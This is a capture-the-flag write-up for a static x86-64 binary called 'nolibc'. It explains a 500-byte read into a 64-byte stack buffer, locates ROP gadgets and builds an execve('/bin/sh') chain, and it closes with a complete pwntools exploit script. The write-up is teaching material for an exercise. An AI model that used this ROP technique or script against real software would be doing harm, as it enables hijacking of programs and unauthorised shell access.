# CTF Writeup: NoLibc Buffer Overflow (ROP)

## Challenge Overview

**Challenge Name:** nolibc
**Type:** Pwn / Binary Exploitation
**Objective:** Exploit a buffer overflow in a static binary to gain a shell.

## 1. The Vulnerability: Stack Buffer Overflow

The core vulnerability lies in the `vuln` function. To understand why it crashes, we need to analyze the assembly instructions that set up the call to `syscall3`.

### The Mismatch

The vulnerability is a classic mismatch between the **allocated memory** and the **read length**.

1. **Allocation:** At the start of `vuln`, the stack frame is created:
   ```asm
   40108d:   sub    rsp,0x40         ; Allocates 64 bytes (0x40) for local variables
   ```

2. **The Flawed Call:** Later, the function calls `syscall3` to read user input. It sets up the arguments like this:
   ```asm
   4010a5: lea    rax,[rbp-0x40]   ; Load address of buffer (located at RBP-64)
   4010a9: mov    ecx,0x1f4        ; ECX = 500 (Size to read)
   4010ae: mov    rdx,rax          ; RDX = Buffer Address (Arg 3)
   4010b1: mov    esi,0x0          ; ESI = 0 (File Descriptor 0: STDIN) (Arg 2)
   4010b6: mov    edi,0x0          ; EDI = 0 (Syscall Number 0: READ) (Arg 1)
   4010bb: call   401000 <syscall3>
   ```

The helper function `syscall3` effectively translates this into the Linux system call:
`read(stdin, buffer, 500);`

### Visualizing the Overflow

We are reading **500 bytes** into a **64-byte** buffer. The input flows upwards in memory addresses (downwards in this visual representation of the stack frame growing down), overwriting crucial control data.

| **Memory Region** | **Size** | **Content** | **Effect** |
| :--- | :--- | :--- | :--- |
| **Buffer** | 64 bytes | `A` * 64 | Filled safely. |
| **Saved RBP** | 8 bytes | `A` * 8 | Caller's stack frame pointer corrupted. |
| **Return Address** | 8 bytes | **ROP Gadget** | **Hijacks Execution Flow.** |
| **Stack Space** | 420 bytes | **Rest of ROP Chain** | Where our arguments and gadgets live. |

Because we can write 500 bytes, we have plenty of space (420+ bytes) after the return address to store our entire ROP chain.

## 2. The Exploit Strategy

Since `NX` is enabled, we must use **ROP (Return Oriented Programming)**. Since there is no `libc`, we must manually invoke a syscall.

To spawn a shell, we need to replicate the behavior of `execve("/bin/sh", NULL, NULL)`. In x64 Assembly, this requires setting specific registers before executing the `syscall` instruction:

| **Register** | **Value** | **Purpose** |
| :--- | :--- | :--- |
| **RAX** | 59 | Syscall Number for `execve` |
| **RDI** | Address of `"/bin/sh"` | 1st Argument (Filename) |
| **RSI** | 0 | 2nd Argument (argv) |
| **RDX** | 0 | 3rd Argument (envp) |

## 3. Gadget Hunting

We need "gadgets" (small instruction sequences ending in `ret`) to pop values from our stack into these registers.

### Question: Why did we combine registers?

**User Question:** *"Why don't we use two separate addresses for `pop rdi` and `pop rax`?"*

**Answer:** In small binaries like this one, we often face "Gadget Scarcity." A standalone `pop rax; ret` gadget simply does not exist in the binary code.

However, we found this sequence at address `0x401071`:

```asm
pop rax
pop rdi
ret
```

Because the CPU executes instructions sequentially, we cannot just jump to the `pop rax` line and stop. We **must** ride the train to the next station (`pop rdi`). Therefore, we use this single gadget to set **both** registers at once.

### The Gadgets We Found

Using `objdump -d nolibc`, we identified helper functions `v1` and `v2` that contain exactly what we need:

1. **Gadget 1 (Set RSI & RDX):**
   * Address: `0x40107f`
   * Instructions: `pop rsi; pop rdx; ret`

2. **Gadget 2 (Set RAX & RDI):**
   * Address: `0x401071`
   * Instructions: `pop rax; pop rdi; ret`

3. **The Syscall:**
   * Address: `0x401028`
   * Instruction: `syscall`

4. **The String:**
   * Address: `0x402000`
   * Value: `"/bin/sh"`

## 4. Constructing the ROP Chain

We need to pad the stack to reach the return address, then stack our gadgets.

**Offset Calculation:**
The buffer is 64 bytes (`0x40`).
The Saved RBP is 8 bytes.
**Total Offset = 72 bytes.**

**The Stack Layout:**

```text
[  Padding (72 'A's)   ]
------------------------ <--- Return Address (RIP)
[ Address of Gadget 1  ] (pop rsi; pop rdx; ret)
[          0           ] -> into RSI
[          0           ] -> into RDX
[ Address of Gadget 2  ] (pop rax; pop rdi; ret)
[         59           ] -> into RAX (execve syscall #)
[ Address of "/bin/sh" ] -> into RDI
[ Address of Syscall   ] -> Triggers the shell
```

## 5. Summary

By chaining these gadgets, we bypass the lack of `libc` and the `NX` protection. We manually arrange the registers to ask the Linux Kernel to replace the current process with `/bin/sh`, giving us full control of the system.

## 6. Final Exploit Script

Below is the complete Python script using `pwntools` to automate the attack.

```python
from pwn import *

# 1. Setup
# Automatically set context (arch, os, etc.) based on the binary
elf = ELF('./nolibc')
context.binary = elf

# Start the process (or connect to remote)
# p = remote('IP_ADDRESS', PORT) 
p = process('./nolibc')

# 2. Configuration
# Offset found via cyclic pattern (buffer 64 + saved rbp 8)
offset = 72

# Addresses found via objdump/strings
# gadget: pop rsi; pop rdx; ret
pop_rsi_rdx = 0x40107f 

# gadget: pop rax; pop rdi; ret
# We use this combined gadget because 'pop rax; ret' does not exist alone.
pop_rax_rdi = 0x401071 

# address of the syscall instruction (inside syscall3 function)
syscall_addr = 0x401028 

# address of string "/bin/sh" found in data section
bin_sh = 0x402000

# 3. Payload Construction
log.info("Building ROP Chain...")

# Start with padding to crash the stack and reach RIP
chain = b'A' * offset

# -- Link 1: Set RSI and RDX to 0 --
chain += p64(pop_rsi_rdx)
chain += p64(0)           # Popped into RSI
chain += p64(0)           # Popped into RDX

# -- Link 2: Set RAX to 59 (execve) and RDI to "/bin/sh" --
chain += p64(pop_rax_rdi)
chain += p64(59)          # Popped into RAX
chain += p64(bin_sh)      # Popped into RDI

# -- Link 3: Trigger Syscall --
chain += p64(syscall_addr)

# 4. Sending
log.success("Sending payload...")
p.sendline(chain)

# 5. Interactive
# If successful, we now have a shell
p.interactive()
